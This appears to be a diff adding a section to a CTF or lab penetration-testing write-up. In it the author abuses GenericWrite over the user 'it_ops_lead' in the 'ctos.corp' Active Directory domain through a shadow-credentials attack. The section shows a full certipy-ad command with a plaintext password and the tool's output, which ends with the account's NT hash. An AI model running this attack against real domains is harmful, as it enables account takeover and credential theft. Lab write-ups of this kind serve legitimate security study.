@@ -1211,5 +1211,36 @@ I have GenericWrite over the user `it_ops_lead`
 
 To abuse this ill perform shadow credentials
 
+# Compromising `it_ops_lead`
 
+```python
+certipy-ad shadow auto -u 'svc_infra_mgr@ctos.corp' -p 'Infr@Mgmt2026!Secure' -account 'it_ops_lead' -dc-host dc01.ctos.corp -dc-ip 10.1.201.146 -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'it_ops_lead'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '70421f4cd723437eb8e4000ab0858808'
+[*] Adding Key Credential with device ID '70421f4cd723437eb8e4000ab0858808' to the Key Credentials for 'it_ops_lead'
+[*] Successfully added Key Credential with device ID '70421f4cd723437eb8e4000ab0858808' to the Key Credentials for 'it_ops_lead'
+[*] Authenticating as 'it_ops_lead' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'it_ops_lead@ctos.corp'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'it_ops_lead.ccache'
+[*] Wrote credential cache to 'it_ops_lead.ccache'
+[*] Trying to retrieve NT hash for 'it_ops_lead'
+[*] Restoring the old Key Credentials for 'it_ops_lead'
+[*] Successfully restored the old Key Credentials for 'it_ops_lead'
+[*] NT hash for 'it_ops_lead': fd8bd0720fec58d0b5005257dd9f3723
+```
+
+I now have the NT hash for the user!
+
+```python
+
+```
 
